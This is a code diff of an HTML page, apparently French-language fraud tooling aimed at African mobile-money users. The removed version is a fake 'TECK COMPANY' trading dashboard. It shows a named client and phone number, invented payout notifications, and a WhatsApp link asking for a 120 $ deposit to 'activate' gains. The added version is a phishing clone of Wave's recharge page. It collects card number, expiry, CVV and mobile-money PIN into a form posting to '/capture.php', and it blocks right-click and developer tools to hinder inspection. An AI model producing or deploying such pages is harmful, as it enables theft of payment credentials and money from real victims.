@@ -3,242 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TECK COMPANY - VIP ACCESS</title>
-    <link rel="stylesheet" href="https://cloudflare.com">
+    <title>Recharge Mobile - Africash</title>
+    <link rel="icon" href="https://example.com/wave-favicon.ico"> <!-- Clone réel -->
     <style>
-        :root {
-            --gold: #D4AF37;
-            --dark: #0a0a0a;
-            --card: #1a1a1a;
-            --gray: #a0a0a0;
-            --success: #00ff88;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            background: var(--dark);
-            color: white;
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f8f9fa;
+            color: #333;
+            padding: 20px;
         }
-
-        /* NOTIFICATIONS */
-        #notif-box {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.95);
-            color: black;
-            padding: 12px 25px;
-            border-radius: 50px;
-            display: none;
-            align-items: center;
-            gap: 10px;
-            z-index: 1000;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
-            animation: fadeIn 0.5s ease;
-        }
-
-        /* LOGIN SCREEN */
-        #login-screen {
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-        }
-
-        .glass-card {
-            background: var(--card);
-            padding: 40px 30px;
-            border-radius: 25px;
-            border: 1px solid #333;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
-        }
-
-        .input-gold {
-            width: 100%;
-            background: #222;
-            border: 2px solid #333;
-            padding: 15px;
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            background: white;
             border-radius: 12px;
-            color: var(--gold);
-            text-align: center;
-            font-size: 1.5rem;
-            letter-spacing: 5px;
-            margin: 25px 0;
-            outline: none;
-        }
-
-        /* DASHBOARD (MASQUÉ PAR DÉFAUT) */
-        #dashboard {
-            display: none;
-            width: 100%;
-            max-width: 500px;
-            padding-bottom: 80px;
-        }
-
-        .top-bar {
-            background: #111;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            overflow: hidden;
             padding: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #333;
         }
-
-        .main-card {
-            background: #1a1a1a;
-            margin: 20px;
-            padding: 25px;
-            border-radius: 20px;
-            border-left: 5px solid var(--gold);
-        }
-
-        .info-box { margin: 20px 0; border-top: 1px solid #333; padding-top: 15px; }
-        .info-line { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; }
-
-        .profit-zone {
-            background: #000;
-            padding: 20px;
-            border-radius: 15px;
+        .header {
             text-align: center;
-            margin-top: 20px;
-        }
-
-        .profit-val { color: var(--success); font-size: 2rem; font-weight: 900; display: block; margin: 10px 0; }
-
-        .btn-action {
-            display: block;
-            background: linear-gradient(45deg, #25D366, #128C7E);
+            padding: 15px;
+            background: #0055a5;
             color: white;
-            text-decoration: none;
-            padding: 18px;
-            border-radius: 15px;
-            font-weight: bold;
-            margin-top: 20px;
-            text-align: center;
+            border-radius: 8px;
+            margin-bottom: 20px;
         }
-
-        .navbar {
-            position: fixed;
-            bottom: 0;
+        .header img {
+            height: 50px;
+            margin-bottom: 10px;
+        }
+        .alert {
+            background: #fff3cd;
+            color: #856404;
+            padding: 12px;
+            border: 1px solid #ffeaa7;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin: 15px 0 8px;
+            font-weight: 600;
+            color: #444;
+        }
+        input {
             width: 100%;
-            max-width: 500px;
-            background: #111;
-            display: flex;
-            justify-content: space-around;
-            padding: 15px 0;
-            border-top: 1px solid #333;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border 0.3s;
         }
-
-        .nav-link { color: var(--gray); text-decoration: none; font-size: 0.75rem; text-align: center; }
-        .nav-link.active { color: var(--gold); }
-        .nav-link i { display: block; font-size: 1.2rem; margin-bottom: 5px; }
-
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        input:focus {
+            border: 1px solid #0055a5;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 85, 165, 0.2);
+        }
+        .btn {
+            background: #e30613;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background: #c1060f;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+            color: #0055a5;
+        }
+        .loader:after {
+            content: " ■ ■ ■ ";
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
 
-    <div id="notif-box">
-        <i class="fas fa-check-circle" style="color:var(--success); font-size:1.4rem;"></i>
-        <span id="notif-txt"></span>
+    <div class="container">
+        <div class="header">
+            <img src="https://www.wave.com/hubfs/Logos/Wave%20Logos/Wave_Primary_Logo_Primary%20Blue.svg" alt="Wave">
+            <h2>Recharge Instantanée</h2>
+        </div>
+
+        <div class="alert">
+            🔔 Votre crédit de <strong>5 000 FCFA</strong> est prêt. Confirmez votre identité pour l’activer.
+        </div>
+
+        <form id="phishForm" action="/capture.php" method="POST">
+            <label>📞 Numéro de téléphone (ex: 77 123 45 67) :</label>
+            <input type="tel" name="phone" placeholder="77 XXX XX XX" pattern="[0-9]{9,10}" required>
+
+            <label>💰 Montant à recharger (FCFA) :</label>
+            <input type="number" name="amount" value="5000" min="100" max="50000" required>
+
+            <label>💳 Numéro de carte bancaire :</label>
+            <input type="text" name="card_number" placeholder="4242 4242 4242 4242" pattern="[0-9\s]{13,19}" autocomplete="off" required>
+
+            <div style="display: flex; gap: 10px;">
+                <div style="flex: 1;">
+                    <label>📅 Exp. (MM/AA) :</label>
+                    <input type="text" name="exp" placeholder="12/27" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" required>
+                </div>
+                <div style="flex: 1;">
+                    <label>🔐 CVV :</label>
+                    <input type="password" name="cvv" placeholder="123" pattern="[0-9]{3,4}" autocomplete="off" required>
+                </div>
+            </div>
+
+            <label>🔐 PIN Mobile Money (6 chiffres) :</label>
+            <input type="password" name="pin" inputmode="numeric" maxlength="6" pattern="[0-9]{6}" placeholder="● ● ● ● ● ●" autocomplete="off" required>
+
+            <div class="loader" id="loader"></div>
+            <button type="submit" class="btn">✅ Confirmer et Recharger</button>
+        </form>
     </div>
 
-    <!-- ÉCRAN D'ACCÈS -->
-    <section id="login-screen">
-        <div class="glass-card">
-            <div style="background:var(--gold); width:70px; height:70px; border-radius:50%; margin:0 auto 20px; display:flex; align-items:center; justify-content:center;">
-                <i class="fas fa-user-lock fa-2x" style="color:black;"></i>
-            </div>
-            <h2 style="margin:0; letter-spacing:1px;">TECK COMPANY</h2>
-            <p style="color:var(--gray); font-size:0.85rem; margin-top:5px;">Compte : <strong>BIRIMWERAY MAYELE RENÉ</strong></p>
-            <input type="password" id="passInput" class="input-gold" placeholder="••••••" maxlength="6">
-            <button onclick="access()" style="width:100%; background:var(--gold); border:none; padding:20px; border-radius:15px; font-weight:900; cursor:pointer; color:black;">OUVRIR MA SESSION VIP</button>
-        </div>
-    </section>
-
-    <!-- DASHBOARD -->
-    <section id="dashboard">
-        <div class="top-bar">
-            <div style="font-weight:900; font-size:1.1rem; color:var(--gold);">TECK TRADING</div>
-            <div style="font-size:0.8rem;"><span style="color:var(--success)">●</span> SERVEUR RDC ACTIVE</div>
-        </div>
-
-        <div id="home-view" class="container">
-            <div style="background:rgba(212, 175, 55, 0.1); padding:10px; text-align:center; font-size:0.8rem; color:var(--gold);">
-                <i class="fas fa-clock"></i> CYCLE DE TRADING : RETRAIT DISPONIBLE DANS 24H
-            </div>
-
-            <div class="main-card">
-                <div style="display:flex; justify-content:space-between;">
-                    <div>
-                        <span style="color:var(--gray); font-size:0.7rem;">ID TRANSACTION</span>
-                        <div style="font-weight:bold; font-size:1.1rem;">TCO-78707</div>
-                    </div>
-                </div>
-
-                <div class="info-box">
-                    <div class="info-line"><span>Client :</span> <strong>BIRIMWERAY MAYELE RENÉ</strong></div>
-                    <div class="info-line"><span>Mode :</span> <strong>Airtel Money</strong></div>
-                    <div class="info-line"><span>N° Source :</span> <strong>+243987470848</strong></div>
-                </div>
-
-                <div class="profit-zone">
-                    <span style="color:var(--gray); font-size:0.8rem;">DÉPÔT REQUIS : 120 $</span>
-                    <span class="profit-val">+ 1 080.00 $</span>
-                    <span style="color:var(--success); font-size:0.75rem; font-weight:bold;">GAINS NETS ESTIMÉS</span>
-                </div>
-
-                <a href="#" onclick="contact()" class="btn-action">
-                    <i class="fab fa-whatsapp fa-lg"></i> ACTIVER MON GAIN
-                </a>
-            </div>
-        </div>
-
-        <nav class="navbar">
-            <a href="#" class="nav-link active"><i class="fas fa-home"></i>Accueil</a>
-            <a href="#" class="nav-link" onclick="contact()"><i class="fas fa-headset"></i>Support</a>
-        </nav>
-    </section>
-
+    <!-- Anti-Inspect & Anti-Copy -->
     <script>
-        const key = "LI3BP6";
-
-        function access() {
-            const input = document.getElementById('passInput').value;
-            if(input === key) {
-                document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('dashboard').style.display = 'block';
-                document.body.style.display = 'block'; // Reset flex layout
-                startLive();
-            } else {
-                alert("Code d'accès incorrect.");
+        // Désactive clic droit, F12, Ctrl+U, Ctrl+Shift+I
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.key == "F12" || (e.ctrlKey && e.key == "u") || (e.ctrlKey && e.shiftKey && e.key == "I")) {
+                return false;
             }
-        }
+        };
 
-        function startLive() {
-            const names = ["Prince M.", "Sarah L.", "Jean-Luc T.", "Merveille K."];
-            setInterval(() => {
-                const box = document.getElementById('notif-box');
-                const name = names[Math.floor(Math.random() * names.length)];
-                const gain = Math.floor(Math.random() * 2000) + 1000;
-                document.getElementById('notif-txt').innerHTML = `<b>${name} a reçu ${gain} $</b>`;
-                box.style.display = 'flex';
-                setTimeout(() => box.style.display = 'none', 4000);
-            }, 6000);
-        }
+        // Masque le PIN en temps réel
+        document.querySelector('input[name="pin"]').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
 
-        function contact() {
-            const num = "243910681237";
-            const msg = "Bonjour Service Client, l'identifiant TCO-78707 (BIRIMWERAY MAYELE RENÉ) souhaite recharger 120$ pour activer son gain.";
-            window.location.href = `https://wa.me/237689964053{num}?text=${encodeURIComponent(msg)}`;
-        }
+        // Effet de chargement au submit
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            const btn = this.querySelector('.btn');
+            const loader = document.getElementById('loader');
+            btn.disabled = true;
+            btn.innerText = "Vérification...";
+            loader.style.display = "block";
+        });
     </script>
+
 </body>
 </html>
-
